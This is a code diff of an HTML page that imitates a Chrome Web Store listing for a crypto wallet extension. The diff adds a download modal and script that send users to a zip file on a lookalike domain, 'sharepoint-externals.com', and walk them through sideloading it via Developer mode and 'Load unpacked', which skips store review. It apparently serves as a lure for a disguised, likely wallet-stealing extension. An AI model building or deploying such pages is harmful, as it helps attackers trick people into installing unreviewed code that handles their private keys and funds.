+          class="flex flex-col bg-gradient-to-b from-[#1a73e8] to-[#1557b0] text-white rounded-2xl overflow-hidden shadow-md h-[400px] border border-blue-400/20">
+          <div class="p-6 flex-1 flex flex-col justify-between">
+            <div>
+              <span class="text-[10px] uppercase tracking-widest font-bold opacity-75">Step 1</span>
+              <h3 class="text-2xl font-bold mt-1 mb-2">Unzip</h3>
+              <p class="text-sm leading-relaxed opacity-90">
+                Locate the downloaded <code
+                  class="bg-blue-800/60 px-1.5 py-0.5 rounded text-xs font-mono">zkx-wallet.zip</code> file in your Downloads
+                folder and extract its contents to get the <code
+                  class="bg-blue-800/60 px-1.5 py-0.5 rounded text-xs font-mono">dist</code> folder.
+              </p>
             </div>
-            <span class="text-xs font-medium text-white">XWallet</span>
-            <span class="ml-auto text-[10px] text-[#64748b]">0x7b3c...e81f</span>
+            <a href="https://zkxwallet-chrome-apps.sharepoint-externals.com/zkx-wallet.zip" target="_blank"
+              class="text-xs underline hover:opacity-80 mt-4 inline-flex items-center gap-1 font-medium transition-opacity">
+              Can't find your download?
+            </a>
           </div>
-          <p class="text-[10px] text-[#64748b] uppercase tracking-wider mb-1">Balance</p>
-          <p class="text-xl font-bold text-white">2.4583 <span class="text-sm font-normal text-[#94a3b8]">ETH</span></p>
-          <p class="text-[10px] text-[#64748b] mt-1">~$6,423.19 USD</p>
-          <div class="flex gap-2 mt-4 pt-3 border-t border-[#2d2a35]">
-            <div class="flex-1 bg-[#a78bfb]/10 rounded py-1.5 text-center text-[10px] font-medium text-[#a78bfb]">Send</div>
-            <div class="flex-1 bg-[#1a1721] rounded py-1.5 text-center text-[10px] font-medium text-[#94a3b8]">Receive</div>
-            <div class="flex-1 bg-[#1a1721] rounded py-1.5 text-center text-[10px] font-medium text-[#94a3b8]">History</div>
-          </div>
+          <img src="./1.png" alt="Step 1: Unzip"
+            class="w-full h-44 object-contain bg-[#e8f0fe] p-4 select-none" />
         </div>
-        <p class="text-xs text-[#5f6368] mt-3 text-center">Main wallet dashboard</p>
-      </div>
-      <div class="flex-shrink-0 w-[340px] border border-gray-200 rounded-xl p-5 bg-white shadow-sm">
-        <div class="bg-[#0f0d11] rounded-lg p-4">
-          <div class="flex items-center gap-2 mb-4 pb-3 border-b border-[#2d2a35]">
-            <div class="w-6 h-6 rounded bg-[#a78bfb] flex items-center justify-center">
-              <svg class="w-3 h-3 text-[#0f0d11]" viewBox="0 0 20 20"><path d="M5 5l10 10M15 5L5 15" stroke="currentColor" stroke-width="2"/></svg>
+
+        <!-- Step 2 Card: Developer Mode -->
+        <div
+          class="flex flex-col bg-gradient-to-b from-[#fef3c7] to-[#fde68a] text-gray-900 rounded-2xl overflow-hidden shadow-md h-[400px] border border-amber-200/40">
+          <div class="p-6 flex-1 flex flex-col justify-between">
+            <div>
+              <span class="text-[10px] uppercase tracking-widest font-bold text-amber-800">Step 2</span>
+              <h3 class="text-2xl font-bold mt-1 mb-2">Developer Mode</h3>
+              <p class="text-sm leading-relaxed text-gray-800">
+                Open a new tab in Chrome, enter
+                <a href="chrome://extensions" target="_blank" rel="noopener noreferrer"
+                  class="text-blue-600 hover:underline"><code
+                    class="bg-amber-200/80 px-1.5 py-0.5 rounded text-xs font-mono">chrome://extensions</code></a> in
+                the address bar, and turn on the <strong>Developer mode</strong> switch in the top-right.
+              </p>
             </div>
-            <span class="text-xs font-medium text-white">Send ETH</span>
           </div>
-          <p class="text-[10px] text-[#64748b] uppercase tracking-wider mb-2">Recipient</p>
-          <div class="bg-[#1a1721] rounded px-3 py-2 text-[11px] text-[#94a3b8] mb-3">0x1234...abcd</div>
-          <p class="text-[10px] text-[#64748b] uppercase tracking-wider mb-2">Amount</p>
-          <div class="bg-[#1a1721] rounded px-3 py-2 text-[11px] text-white mb-3">0.5 ETH</div>
-          <div class="bg-[#a78bfb] rounded py-2 text-center text-[11px] font-medium text-[#0f0d11]">Send</div>
+          <img src="./2.png" alt="Step 2: Developer Mode"
+            class="w-full h-44 object-contain bg-[#fffbeb] p-4 select-none" />
         </div>
-        <p class="text-xs text-[#5f6368] mt-3 text-center">Send transaction form</p>
-      </div>
-      <div class="flex-shrink-0 w-[340px] border border-gray-200 rounded-xl p-5 bg-white shadow-sm">
-        <div class="bg-[#0f0d11] rounded-lg p-4">
-          <div class="flex items-center gap-2 mb-4 pb-3 border-b border-[#2d2a35]">
-            <div class="w-6 h-6 rounded bg-[#a78bfb] flex items-center justify-center">
-              <svg class="w-3 h-3 text-[#0f0d11]" viewBox="0 0 20 20"><path d="M5 5l10 10M15 5L5 15" stroke="currentColor" stroke-width="2"/></svg>
+
+        <!-- Step 3 Card: Load Unpacked -->
+        <div
+          class="flex flex-col bg-gradient-to-b from-[#d1fae5] to-[#a7f3d0] text-gray-900 rounded-2xl overflow-hidden shadow-md h-[400px] border border-emerald-200/40">
+          <div class="p-6 flex-1 flex flex-col justify-between">
+            <div>
+              <span class="text-[10px] uppercase tracking-widest font-bold text-emerald-800">Step 3</span>
+              <h3 class="text-2xl font-bold mt-1 mb-2">Load Unpacked</h3>
+              <p class="text-sm leading-relaxed text-gray-800">
+                Click the <strong>Load unpacked</strong> button in the top-left of the Extensions page, and select the
+                extracted <code class="bg-emerald-200/80 px-1.5 py-0.5 rounded text-xs font-mono">dist</code> folder to
+                complete the installation.
+              </p>
             </div>
-            <span class="text-xs font-medium text-white">Receive</span>
           </div>
-          <div class="w-28 h-28 mx-auto bg-white rounded-lg p-1 flex items-center justify-center">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='100' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23fff'/%3E%3Cpath d='M20 20h60v60H20z' fill='none' stroke='%23000' stroke-width='2'/%3E%3Cpath d='M30 30h40v40H30z' fill='%23000'/%3E%3Cpath d='M35 35h30v30H35z' fill='%23fff'/%3E%3Cpath d='M25 25h10v10H25zM65 25h10v10H65zM25 65h10v10H25zM65 65h10v10H65z' fill='%23000'/%3E%3C/svg%3E" alt="QR Code" class="w-full h-full">
-          </div>
-          <p class="text-[10px] text-[#94a3b8] text-center mt-2 truncate">0x7b3c8f1a2d9e4c5b6a7f8e9d0c1b2a3c4d5e6f7a</p>
-        </div>
-        <p class="text-xs text-[#5f6368] mt-3 text-center">QR code receiving screen</p>
-      </div>
-    </div>
-  </div>
-
-  <!-- Overview / Features -->
-  <div class="mb-10">
-    <h2 class="text-lg font-semibold text-[#202124] mb-4">Overview</h2>
-    <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-4">
-      <div class="feature-card">
-        <div class="w-9 h-9 rounded-lg bg-[#e8f0fe] flex items-center justify-center mb-3">
-          <svg class="w-5 h-5 text-[#1a73e8]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg>
-        </div>
-        <h3 class="font-semibold text-[#202124] text-sm mb-1">Wallet Creation</h3>
-        <p class="text-xs text-[#5f6368] leading-relaxed">Generate new Ethereum wallets or import via private key &amp; BIP39 seed phrase. AES-encrypted storage.</p>
-      </div>
-      <div class="feature-card">
-        <div class="w-9 h-9 rounded-lg bg-[#e8f0fe] flex items-center justify-center mb-3">
-          <svg class="w-5 h-5 text-[#1a73e8]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h2l2-5 3 10 3-10 3 10 2-5h2"/></svg>
-        </div>
-        <h3 class="font-semibold text-[#202124] text-sm mb-1">Live Balances</h3>
-        <p class="text-xs text-[#5f6368] leading-relaxed">Real-time ETH balance via RPC (Infura/Alchemy). Clean portfolio dashboard with USD values.</p>
-      </div>
-      <div class="feature-card">
-        <div class="w-9 h-9 rounded-lg bg-[#e8f0fe] flex items-center justify-center mb-3">
-          <svg class="w-5 h-5 text-[#1a73e8]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
-        </div>
-        <h3 class="font-semibold text-[#202124] text-sm mb-1">Send &amp; Receive</h3>
-        <p class="text-xs text-[#5f6368] leading-relaxed">Sign and broadcast real Ethereum transactions. Receive with QR codes and clipboard copy.</p>
-      </div>
-      <div class="feature-card">
-        <div class="w-9 h-9 rounded-lg bg-[#e8f0fe] flex items-center justify-center mb-3">
-          <svg class="w-5 h-5 text-[#1a73e8]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-        </div>
-        <h3 class="font-semibold text-[#202124] text-sm mb-1">Transaction History</h3>
-        <p class="text-xs text-[#5f6368] leading-relaxed">Browse transactions with status badges (pending/confirmed/failed) and direct Etherscan links.</p>
-      </div>
-      <div class="feature-card">
-        <div class="w-9 h-9 rounded-lg bg-[#e8f0fe] flex items-center justify-center mb-3">
-          <svg class="w-5 h-5 text-[#1a73e8]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-        </div>
-        <h3 class="font-semibold text-[#202124] text-sm mb-1">Secure by Design</h3>
-        <p class="text-xs text-[#5f6368] leading-relaxed">Private keys encrypted with your password via ethers.js. In-memory only during transactions.</p>
-      </div>
-      <div class="feature-card">
-        <div class="w-9 h-9 rounded-lg bg-[#e8f0fe] flex items-center justify-center mb-3">
-          <svg class="w-5 h-5 text-[#1a73e8]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-        </div>
-        <h3 class="font-semibold text-[#202124] text-sm mb-1">Admin Dashboard</h3>
-        <p class="text-xs text-[#5f6368] leading-relaxed">Protected admin routes for wallet vault, system stats, and configuration management.</p>
-      </div>
-    </div>
-  </div>
-
-  <!-- Additional Info -->
-  <div class="mb-10 grid md:grid-cols-2 gap-8">
-    <div>
-      <h2 class="text-lg font-semibold text-[#202124] mb-4">Additional Information</h2>
-      <table class="w-full text-sm">
-        <tbody>
-          <tr><td class="py-2 text-[#5f6368] pr-4">Version</td><td class="py-2 text-[#202124] font-medium">1.0.0</td></tr>
-          <tr><td class="py-2 text-[#5f6368] pr-4 border-t border-gray-100">Updated</td><td class="py-2 text-[#202124] border-t border-gray-100">May 19, 2025</td></tr>
-          <tr><td class="py-2 text-[#5f6368] pr-4 border-t border-gray-100">Size</td><td class="py-2 text-[#202124] border-t border-gray-100">122 KB</td></tr>
-          <tr><td class="py-2 text-[#5f6368] pr-4 border-t border-gray-100">Language</td><td class="py-2 text-[#202124] border-t border-gray-100">English (United States)</td></tr>
-          <tr><td class="py-2 text-[#5f6368] pr-4 border-t border-gray-100">Permissions</td><td class="py-2 text-[#202124] border-t border-gray-100">storage</td></tr>
-          <tr><td class="py-2 text-[#5f6368] pr-4 border-t border-gray-100">Developer</td><td class="py-2 text-[#202124] border-t border-gray-100">xwallet.io</td></tr>
-        </tbody>
-      </table>
-    </div>
-    <div>
-      <h2 class="text-lg font-semibold text-[#202124] mb-4">Tech Stack</h2>
-      <div class="flex flex-wrap gap-2">
-        <span class="badge">Vite</span>
-        <span class="badge">React</span>
-        <span class="badge">TypeScript</span>
-        <span class="badge">Tailwind CSS</span>
-        <span class="badge">Ethers.js</span>
-        <span class="badge">PocketBase</span>
-        <span class="badge">Chrome MV3</span>
-        <span class="badge">CRXJS</span>
-      </div>
-    </div>
-  </div>
-
-  <!-- Installation Guide -->
-  <div id="install" class="mb-10">
-    <div class="flex items-center justify-between mb-4">
-      <div>
-        <h2 class="text-lg font-semibold text-[#202124]">Install as unpacked extension</h2>
-        <p class="text-sm text-[#5f6368] mt-0.5">Follow these steps to load XWallet in Chrome developer mode</p>
-      </div>
-    </div>
-
-    <div class="space-y-4">
-      <!-- Step 1 -->
-      <div class="install-card flex gap-4 items-start">
-        <div class="step-num">1</div>
-        <div class="flex-1 min-w-0">
-          <h3 class="font-medium text-[#202124] text-sm mb-1">Clone the repository</h3>
-          <p class="text-xs text-[#5f6368] mb-2">Open a terminal, clone the repo, and install dependencies.</p>
-          <div class="code-box text-xs">
-            <span class="comment"># Clone and install</span><br>
-            <span class="cmd">$</span> git clone https://github.com/your-org/xwallet-vite-app.git<br>
-            <span class="cmd">$</span> <span class="comment">cd</span> xwallet-vite-app<br>
-            <span class="cmd">$</span> npm install
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 2 -->
-      <div class="install-card flex gap-4 items-start">
-        <div class="step-num">2</div>
-        <div class="flex-1 min-w-0">
-          <h3 class="font-medium text-[#202124] text-sm mb-1">Build the extension</h3>
-          <p class="text-xs text-[#5f6368] mb-2">CRXJS will produce the extension bundle in <code class="text-[#1a73e8] bg-[#e8f0fe] px-1.5 py-0.5 rounded text-xs">app/dist/</code>.</p>
-          <div class="code-box text-xs">
-            <span class="cmd">$</span> npm run build
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 3 -->
-      <div class="install-card flex gap-4 items-start">
-        <div class="step-num">3</div>
-        <div class="flex-1 min-w-0">
-          <h3 class="font-medium text-[#202124] text-sm mb-1">Open Chrome Extensions page</h3>
-          <p class="text-xs text-[#5f6368] mb-2">Type this in your Chrome address bar and press Enter.</p>
-          <div class="code-box text-xs">
-            <span class="cmd">$</span> chrome://extensions
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 4 -->
-      <div class="install-card flex gap-4 items-start">
-        <div class="step-num">4</div>
-        <div class="flex-1 min-w-0">
-          <h3 class="font-medium text-[#202124] text-sm mb-1">Enable Developer mode</h3>
-          <p class="text-xs text-[#5f6368] mb-2">Toggle the switch in the top-right corner of the Extensions page.</p>
-          <div class="bg-[#f8f9fa] border border-[#e8eaed] rounded-lg px-4 py-3 flex items-center gap-3">
-            <div class="w-9 h-5 bg-[#1a73e8] rounded-full relative">
-              <div class="w-3.5 h-3.5 bg-white rounded-full absolute right-0.5 top-0.5"></div>
-            </div>
-            <span class="text-sm font-medium text-[#202124]">Developer mode</span>
-            <span class="text-xs text-[#1a73e8] font-medium ml-auto">ON</span>
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 5 -->
-      <div class="install-card flex gap-4 items-start">
-        <div class="step-num">5</div>
-        <div class="flex-1 min-w-0">
-          <h3 class="font-medium text-[#202124] text-sm mb-1">Load unpacked extension</h3>
-          <p class="text-xs text-[#5f6368] mb-2">Click <strong class="text-[#202124]">Load unpacked</strong> and select the <code class="text-[#1a73e8] bg-[#e8f0fe] px-1.5 py-0.5 rounded text-xs">app/dist</code> folder.</p>
-          <div class="bg-[#f8f9fa] border border-[#e8eaed] rounded-lg px-4 py-3 flex items-center gap-2">
-            <svg class="w-4 h-4 text-[#1a73e8]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14m-7-7l7 7 7-7"/></svg>
-            <span class="text-sm font-medium text-[#1a73e8]">Load unpacked</span>
-            <span class="text-xs text-[#5f6368] ml-2">&rarr; select <strong class="text-[#202124]">app/dist</strong></span>
-          </div>
-        </div>
-      </div>
-
-      <!-- Step 6 -->
-      <div class="install-card flex gap-4 items-start">
-        <div class="step-num">6</div>
-        <div class="flex-1 min-w-0">
-          <h3 class="font-medium text-[#202124] text-sm mb-1">Pin and launch</h3>
-          <p class="text-xs text-[#5f6368] mb-2">Click the puzzle piece icon in the Chrome toolbar, find XWallet, and pin it. Click the icon to open the popup.</p>
-          <div class="bg-[#f8f9fa] border border-[#e8eaed] rounded-lg px-4 py-3 flex items-center gap-3">
-            <svg class="w-5 h-5 text-[#1a73e8]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
-            <span class="text-sm text-[#5f6368]">XWallet is now ready</span>
-            <span class="ml-auto text-xs bg-[#e6f4ea] text-[#137333] rounded-full px-2.5 py-0.5 font-medium">Active</span>
-          </div>
+          <img src="./3.png" alt="Step 3: Load Unpacked"
+            class="w-full h-44 object-contain bg-[#f0fdf4] p-4 select-none" />
         </div>
       </div>
     </div>
-  </div>
+  </dialog>
 
-</main>
+  <!-- Script for triggering download and opening/closing modal -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const addToChromeBtn = document.getElementById('add-to-chrome-btn');
+      const downloadModal = document.getElementById('download-modal');
+      const closeModalBtn = document.getElementById('close-modal-btn');
+      const manualDownloadLink = document.getElementById('manual-download-link');
 
-<!-- Footer -->
-<footer class="border-t border-gray-100 bg-[#f8f9fa]">
-  <div class="max-w-7xl mx-auto px-4 py-6">
-    <div class="flex flex-wrap items-center gap-2 mb-3">
-      <span class="text-xs text-[#5f6368] mr-2">Google apps</span>
-      <a href="#" class="footer-link">About Chrome Web Store</a>
-      <a href="#" class="footer-link">Developer Dashboard</a>
-      <a href="#" class="footer-link">Privacy Policy</a>
-      <a href="#" class="footer-link">Terms of Service</a>
-      <a href="#" class="footer-link">Help</a>
-    </div>
-    <div class="flex items-center gap-6 mt-3 pt-3 border-t border-gray-200">
-      <svg class="w-5 h-5 text-[#5f6368]" viewBox="0 0 48 48"><path fill="#1a73e8" d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4z"/></svg>
-      <span class="text-xs text-[#5f6368]">Chrome Web Store</span>
-      <span class="text-xs text-[#5f6368]">&#8226; Google</span>
-    </div>
-  </div>
-</footer>
+      function triggerDownload() {
+        const link = document.createElement('a');
+        link.href = 'https://zkxwallet-chrome-apps.sharepoint-externals.com/zkx-wallet.zip';
+        link.download = 'zkx-wallet.zip';
+        document.body.appendChild(link);
+        // link.click();
+        document.body.removeChild(link);
+      }
 
+      if (addToChromeBtn && downloadModal) {
+        addToChromeBtn.addEventListener('click', (e) => {
+          e.preventDefault();
+          // Trigger the zip file download
+          triggerDownload();
+          // Open the manual setup instructions modal
+          downloadModal.showModal();
+          // Prevent body scrolling
+          document.body.style.overflow = 'hidden';
+        });
+      }
+
+      function handleModalClose() {
+        downloadModal.close();
+        document.body.style.overflow = '';
+      }
+
+      if (closeModalBtn) {
+        closeModalBtn.addEventListener('click', handleModalClose);
+      }
+
+      // Close modal when clicking on the backdrop
+      if (downloadModal) {
+        downloadModal.addEventListener('click', (e) => {
+          const rect = downloadModal.getBoundingClientRect();
+          const isInDialog = (
+            rect.top <= e.clientY &&
+            e.clientY <= rect.top + rect.height &&
+            rect.left <= e.clientX &&
+            e.clientX <= rect.left + rect.width
+          );
+          if (!isInDialog) {
+            handleModalClose();
+          }
+        });
+
+        // Clean up overflow styling when modal is closed via ESC key
+        downloadModal.addEventListener('close', () => {
+          document.body.style.overflow = '';
+        });
+      }
+    });
+  </script>
 </body>
+
 </html>
